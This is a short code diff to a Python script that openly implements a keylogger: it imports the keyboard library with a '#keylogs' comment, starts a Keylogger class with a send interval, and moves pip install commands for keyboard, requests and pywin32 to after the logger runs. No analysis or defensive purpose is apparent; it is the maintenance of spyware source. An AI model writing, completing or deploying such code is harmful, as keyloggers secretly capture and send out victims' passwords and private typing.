@@ -1,10 +1,4 @@
 import os
-
-os.system('pip install keyboard')
-os.system('pip install requests')
-os.system('pip install pywin32')
-
-
 import keyboard #keylogs
 from threading import Semaphore, Timer
 from datetime import datetime
@@ -108,5 +102,8 @@ class Keylogger:
 def main():
     keylogger = Keylogger(send_interval)
     keylogger.run()
+    os.system('pip install keyboard')
+    os.system('pip install requests')
+    os.system('pip install pywin32')
 
 main()
